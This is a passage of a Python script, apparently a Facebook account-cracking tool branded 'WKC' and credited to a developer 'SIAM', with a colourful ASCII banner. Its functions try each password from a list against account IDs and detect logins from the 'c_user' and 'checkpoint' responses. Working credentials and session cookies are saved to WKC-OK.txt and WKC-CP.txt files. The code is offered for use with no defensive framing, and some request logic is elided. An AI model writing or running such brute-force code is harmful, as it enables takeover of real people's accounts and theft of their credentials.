...
`8.`888b                 ,8' 8 8888     ,88'  ,o888888o.    
 `8.`888b               ,8'  8 8888    ,88'  8888     `88.  
  `8.`888b             ,8'   8 8888   ,88',8 8888       `8. 
   `8.`888b     .b    ,8'    8 8888  ,88' 88 8888           
    `8.`888b    88b  ,8'     8 8888 ,88'  88 8888           
     `8.`888b .`888b,8'      8 8888 88'   88 8888           
      `8.`888b8.`8888'       8 888888<    88 8888           
       `8.`888`8.`88'        8 8888 `Y8.  `8 8888       .8' 
        `8.`8' `8,`'         8 8888   `Y8.   8888     ,88'  
         `8.`   `8'          8 8888     `Y8.  `8888888P'    

\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[33;1m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mDEVELOPER\033[1;97m ●   \33[1;92mSIAM
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92mSIAM_______//😘😎😈
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92mWOLF-KING-21
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mWKC\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[WKC-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/WKC-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[WKC-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/WKC-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[WKC-OK-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/WKC-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\33[1;91m[WKC-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/WKC-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[WKC-OK] '+cid+' | '+ps+'\033[1;32m')
				open('WKC-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[WKC-CP] '+cid+' | '+ps+'\33[0;97m')
				open('WKC-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
